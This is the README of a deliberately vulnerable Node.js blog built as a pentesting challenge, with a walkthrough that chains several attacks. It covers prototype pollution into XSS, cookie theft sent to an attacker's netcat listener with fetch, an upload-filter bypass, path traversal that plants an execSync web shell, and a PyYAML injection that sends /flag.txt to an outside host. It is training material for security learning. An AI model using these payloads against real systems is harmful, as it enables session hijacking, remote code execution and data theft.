# DISCLAIMER: This is a pentesting-challenge! Do not expose these containers to the public!

It is designed to showcase common javascript vulnerabilities. So be careful!

# My new BLOG 🎉

I decided to rewrite my blog using the cool new shiny web tech. After a friend
showed me that my old php code was vulnerable to some XSS and SQL injection, he
said that I would be better off using nodejs!

So here I am. Since I started the previous one, I learned a lot about how to
turn websites into SPAs, how to separate the client- and server-side and how to
use JWT to authenticate requests. This is going to be sooo much better, eh?

## Setup

If you want to run this challenge locally on your system, you can simply clone
this repository and run `docker compose up --build` inside this folder. This
should spawn a couple of containers with one of them listening on port 8080,
which you can open in a browser to interact with the application.

Tokens and secrets found in .env files do not count as part of the challenge,
but the rest of the source code is.

## Hints

<details>
  <summary>List of Flags</summary>
  There are two flags in this challenge, located at the root of the node and the python container in a file called `flag.txt`.
</details>
<details>
  <summary>List of vulnerabilities</summary>

This app contains the following vulnerabilities (that I know of 😬)

proposed way:

1. client-side prototype pollution
2. leading to reflected XSS
3. cookie stealing
4. broken file upload filters
5. arbitrary file overwrite
6. leading to RCE
7. yaml-injection
8. leading to RCE in another container

alternatively:

1. JWT-token forgery

</details>

## Walkthrough

<details>
  <summary>How to 1</summary>

The application state is stored using query parameters. The `web/html/state.js`
contains the code how the query/search-string is converted into
javascript-object and the other way around. This allows use to set arbitrary
values on nested structures like `a[b][c]=1`.

Introducing `__proto__`! The `__proto__` property in javascript is part of the
javascript inheritance model. It contains a reference to an object that this
object should inherit properties from. The vulnerability is that setting a value
like `__proto__[a]=1` causes the property `a` to exist on all javascript objects
that share the same prototype. In this case it is simply every object that
exists.

You can try this in the javascript console on the page! Frist, set the URLs
query string to `?__proto__[a]=1`. Then create a new object and read it's `a`
property: `const x = {}; console.log(x.a)`!

</details>

<details>
  <summary>How to 2</summary>

Now that we can create _phantom_ properties on all objects, we can try to find
code where a certain property value gives us some sort of code execution. We
cannot simply overwrite function calls, as our way to pollute the prototype only
allows string.

Blog posts are rendered using `iframes`. The post itself contains HTML code that
is loaded from a specific URL, included in the posts `src` property. If the post
we are trying to access does not exist, the SPA still tries to load the iframe.
Using prototype pollution we can now set a "default" `src` value to load if the
post does not exist.

Our URL can now contain any common XSS payload like
`__proto__[src]=javascript:alert('XSS')`.

</details>

<details>
  <summary>How to 3</summary>

Now that we have reflected XSS we can abuse the complaint functionality to have
a moderator check out our newly found XSS skills!

Moderators are usually signed in when clicking on links and we are able to run
code on their machine, grab the cookies and send them over to a machine we
control!

The easiest way to send something from javascript to a given IP or URL is using
the `fetch`-API. `fetch` is a global function to invoke a web-request. In order
to give our target something to connect to, we need to provide a simple
tcp-Listener on our own machine. This can be done using the netcat utility on
most linux-based OS. Run `nc -l 8081` to start a listener or port 8081.

Say your local IP is `172.17.0.1` you would want the following javascript to run
on the target machine: `fetch('http://172.17.0.1:8081?'+document.cookie)`. This
would then be converted to the full URL query-payload:
`__proto__[src]=javascript:fetch('http://172.17.0.1:8081?'%2Bdocument.cookie)`

Once you opened this URL yourself you should already see the request logged in
your netcat window. So, time to rearm netcat and complain about this
_totally-innocent-looking_ url! If done correctly, you should see the the stolen
cookie in your netcat window.

Last but not least, you can open up your browsers debug console and enter the
stolen cookie as a cookie of your own.

</details>

<details>
  <summary>How to 4</summary>

> I'm in!

We finally have access to the media upload feature! Those are always great...
(to exploit, that is.)

We can upload actual images just fine, like png, jpg, and gif. Let's find a way
to trick the filter into accepting a file that we can make some use of.

The server is written in javascript, but javascript files ain't no image! Let's
fix that. Take an arbitrary .js file, prepend the code with `GIF89a = 0;` and
voila, you now have turned your code into a "valid" gif file (there are
exceptions to this though [search ECMAScript modules and strict mode])!

But trying to upload the file though the UI is still not working. If we go to
the browsers debug console and navigate to the network tab, we can inspect the
actual upload request the UI is making to the server. Looking closely at what
gets send, we can see a `content-type` header that is still showing
`application/javascript`! Let's fix that. First, right click the network request
in the list and select `copy -> as fetch`. Now, paste it back into the
javascript console below and adjust the header to show `image/gif`. Once you hit
enter, the request should go through and our file is now available in the
`/media` folder.

</details>

<details>
  <summary>How to 5</summary>

Now that we can upload javascript code, how can we make use of it? We need
another vulnerability! One to overwrite arbitrary files in the projects source
code, so we can implant our own version of the code into the application.

To do so, we make use of the fact, that the uploaded files name is url-decoded
prior to writing to the disk. This means that url-encoding our path allows us to
write content anywhere on the filesystem where the user has permission to write.

Furthermore we can actually take a look at the source code of the application
and create our malicious upload to replace an existing source-file, so it does
not harm the applications regular behavior.

We really only have **one try**, because once we overwrite a file in a bad way,
the application might get stuck in a **crash loop**.

Luckily there is a lost `test.js` file dangling in the projects src folder that
does not seem to do anything, but it is loaded into runtime through `index.js`.
Perfect for us to put our payload! Almost as if the author intended us to find
it...

Example RCE-Payload `../src/test.js`:

```js
GIF89a = 0;
const { complain } = require("./complain.js");
const { execSync } = require("child_process");

complain.get("/rce", (req, res) => {
  res.send(execSync(req.query.cmd).toString("utf-8"));
});
```

This payload hooks itself into the webserver through the complain module and
would allow us to to run `GET /api/rce?cmd=pwd` to return the output of any
shell command back to us.

But how do we get nodejs to actually include out file into the running
application?

</details>

<details>
  <summary>How to 6</summary>

Last but not least, we need to find a way for the nodejs runtime to actually
load our modified version of the files.

We can do so easily by making the server crash. Once it is down, the docker
engine will automatically restart the container with all the changes made to it
still in place.

There is one way to crash the server that is easy to trigger when uploading an
invalid file that does not result in a "mimetype" to be detected by the server.
In this case the server tries to read the type property anyway, resulting in a
crash.

Uploading a simple plain-text file should work fine for this purpose.

With everything in place, we should be able to read the contents of the
`/flag.txt` that is located inside the container and score our first flag!

</details>

<details>
  <summary>How to 7</summary>

To continue our journey through this stack, we now need to move laterally into
another container where the final flag can be found.

From the source-code we know that we have a python process, that repeatedly
accesses the database to plot a graph with the view_count that gets stored
alongside each post. This view_count is an integer, right? Perfect to store in a
yaml-array and plot on a graph.

But now that we have full access to the nodejs application, we can easily modify
the database-schema to contain any data that we might want to use to attack the
application reading it. In our case, we can use this to inject a malicious
yaml-payload. All we need to do is to modify the database-scheme to allow text
in the view_count column and inject our payload into one of the posts
view_count.

First

```SQL
ALTER TABLE blog.posts CHANGE view_count view_count TEXT NOT NULL;
```

and now to place our exploit

```SQL
UPDATE `blog`.`posts` SET `view_count` = '<our exploit code here>' WHERE (`id` = '3');
```

In order to not break the structure of the yaml-file that we are injecting to,
we need to make sure that the syntax remains correct. One example of an
injection that does not break the syntax would be

```SQL
UPDATE `blog`.`posts` SET `view_count` = 'test: "I am an object with a string property called test"' WHERE (`id` = '3');
```

</details>

<details>
  <summary>How to 8</summary>
  Next we need some payload that actually causes the python-code to leak the final flag. A basic example yaml-injection for python is this:

```yaml
test: !!python/object/apply:eval
  - print("Hi World!")
```

_note: This only works when using the unsafe_load function within pyyaml, which
is being used in our target application_

In order to actually leak the flag, we need to send it over the network. So the
payload we can use to do this looks like this:

```yaml
test: !!python/object/apply:eval
  - exec('from urllib import request; request.urlopen("http://172.17.0.1:8081?q="+open("/flag.txt").readline())')
```

Be careful when adding the payload to the database to actually keep the syntax
of the resulting yaml in-tact. The value of view_count is appended to the yaml
with the prefix `-` followed by `\n`. This means that when using multiple lines
in the payload, like we do above, you need to have 4 spaces ahead of the
`- exec` in the second line.

yay, second flag.

</details>
